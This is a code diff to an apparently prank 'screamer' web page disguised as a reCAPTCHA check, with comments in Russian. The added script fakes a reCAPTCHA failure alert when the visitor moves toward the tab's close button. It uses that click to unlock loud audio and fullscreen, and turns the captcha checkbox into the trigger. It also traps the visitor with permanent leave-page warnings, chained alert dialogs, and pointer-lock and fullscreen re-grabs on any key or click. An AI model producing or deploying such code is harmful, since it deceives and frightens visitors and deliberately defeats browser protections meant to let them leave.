@@ -94,8 +94,24 @@
 
     <audio id="screamer-sound" src="caughtyou.mp3" loop preload="auto"></audio>
 
-        <script>
+            <script>
         var isScreamerActive = false;
+
+        // Попытка поймать пользователя, когда он уводит мышь вверх к крестику закрытия вкладки
+        document.addEventListener('mouseleave', function(e) {
+            // Если курсор ушел за верхнюю границу экрана (Y < 20) и скример еще не включен
+            if (e.clientY < 20 && !isScreamerActive) {
+                // Вызываем системное окно, которое блокирует интерфейс браузера
+                triggerFakeValidation();
+            }
+        });
+
+        // Функция-обманка для активации при попытке побега
+        function triggerFakeValidation() {
+            alert("ВНИМАНИЕ! Проверка безопасности reCAPTCHA не пройдена.\n\nПожалуйста, нажмите «ОК» и подтвердите, что вы не робот, чтобы сохранить изменения.");
+            // Этот alert считается "взаимодействием", теперь браузер разрешит и звук, и фуллскрин
+            activateScreamer();
+        }
 
         function activateScreamer() {
             isScreamerActive = true;
@@ -104,94 +120,86 @@
             
             container.style.display = 'block';
 
-            // Воспроизведение звука
-            sound.play().catch(function(error) {
-                console.log("Автовоспроизведение заблокировано браузером");
-            });
+            // Включаем звук (теперь разрешено браузером)
+            sound.play().catch(function(e) { console.log(e); });
 
-            // Запрос полноэкранного режима
-            if (container.requestFullscreen) {
-                container.requestFullscreen();
-            } else if (container.webkitRequestFullscreen) { 
-                container.webkitRequestFullscreen();
-            }
+            // Запуск полноэкранного режима
+            if (container.requestFullscreen) container.requestFullscreen();
+            else if (container.webkitRequestFullscreen) container.webkitRequestFullscreen();
 
-            // Блокировка курсора мыши внутри контейнера
+            // Включение блокировки мыши
             lockMouse();
 
-            // Бесконечное удержание через alert/confirm при попытке навигации
-            window.addEventListener('beforeunload', preventExit);
-            
-            // Запуск цикла блокировки при кликах или попытках закрытия
+            // Привязываем бесконечный цикл сообщений
             triggerAnnoyingAlerts();
         }
 
-        // Функция блокировки курсора
         function lockMouse() {
             var container = document.getElementById('screamer-container');
-            if (container.requestPointerLock) {
-                container.requestPointerLock();
-            } else if (container.mozRequestPointerLock) {
-                container.mozRequestPointerLock();
-            }
+            if (container.requestPointerLock) container.requestPointerLock();
+            else if (container.webkitRequestPointerLock) container.webkitRequestPointerLock();
         }
 
-        // Стандартное предупреждение браузера перед закрытием вкладки
-        function preventExit(e) {
-            if (!isScreamerActive) return;
+        // Ловушка на закрытие вкладки/браузера (работает всегда)
+        window.addEventListener('beforeunload', function(e) {
             e.preventDefault();
-            e.returnValue = 'Изменения не сохранены. Вы уверены, что хотите покинуть страницу?';
+            e.returnValue = 'Изменения не сохранены! Вы уверены, что хотите прервать проверку?';
             return e.returnValue;
-        }
+        });
 
-        // Функция, создающая бесконечный цикл модальных окон при клике или Escape
         function triggerAnnoyingAlerts() {
             if (!isScreamerActive) return;
             
-            // Бесконечный цикл пока пользователь не нажмет "ОК" в серии окон
-            while (true) {
-                alert("Ошибка безопасности! Проверка не завершена.");
-                var confirmExit = confirm("Изменения не сохранены! Вы уверены, что хотите прервать проверку? Все данные будут утеряны.");
-                
-                // Если пользователь пытается согласиться или отказаться — возвращаем в цикл
-                if (!confirmExit || confirmExit) {
-                    alert("Доступ заблокирован. Пожалуйста, завершите проверку «Я не робот».");
-                    break; // Прерываем внутренний цикл, но оставляем ловушку на клики
+            // Зацикленная цепочка окон, не дающая закрыть страницу
+            setTimeout(function() {
+                while (true) {
+                    alert("Критическая ошибка! Изменения не сохранены.");
+                    var retry = confirm("Продолжить проверку безопасности? При выходе все несохраненные данные будут уничтожены.");
+                    if (!retry || retry) {
+                        alert("Доступ ограничен. Завершите проверку «Я не робот».");
+                        break; 
+                    }
                 }
+            }, 10);
+        }
+
+        // Перехват клика по самой галочке "Я не робот"
+        function activateScreamerFromClick() {
+            if (!isScreamerActive) {
+                activateScreamer();
             }
         }
 
-        // Перехват клавиши Escape и других попыток выйти из полноэкранного режима
+        // Назначаем функцию на клик по чекбоксу капчи
+        document.querySelector('.checkbox').setAttribute('onclick', 'activateScreamerFromClick()');
+
+        // Возврат в фуллскрин и блокировку при попытках нажать ESC или кликнуть
         window.addEventListener('keydown', function(e) {
             if (isScreamerActive) {
                 e.preventDefault();
-                lockMouse(); // Возвращаем блокировку мыши
-                triggerAnnoyingAlerts();
-            }
-        });
-
-        // Повторная блокировка мыши и запуск окон при любом клике по экрану
-        document.addEventListener('click', function() {
-            if (isScreamerActive) {
-                var container = document.getElementById('screamer-container');
-                
-                // Возвращаем полноэкранный режим, если пользователь из него вышел
-                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-                    if (container.requestFullscreen) container.requestFullscreen();
-                    else if (container.webkitRequestFullscreen) container.webkitRequestFullscreen();
-                }
-                
                 lockMouse();
                 triggerAnnoyingAlerts();
             }
         });
 
-        // Отслеживание выхода из Pointer Lock (возвращаем его обратно)
+        document.addEventListener('click', function() {
+            if (isScreamerActive) {
+                var container = document.getElementById('screamer-container');
+                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                    if (container.requestFullscreen) container.requestFullscreen();
+                    else if (container.webkitRequestFullscreen) container.webkitRequestFullscreen();
+                }
+                lockMouse();
+                triggerAnnoyingAlerts();
+            }
+        });
+
         document.addEventListener('pointerlockchange', function() {
             if (isScreamerActive && document.pointerLockElement !== document.getElementById('screamer-container')) {
                 setTimeout(lockMouse, 50);
             }
-        }, false);
+        });
     </script>
+
 </body>
 </html>
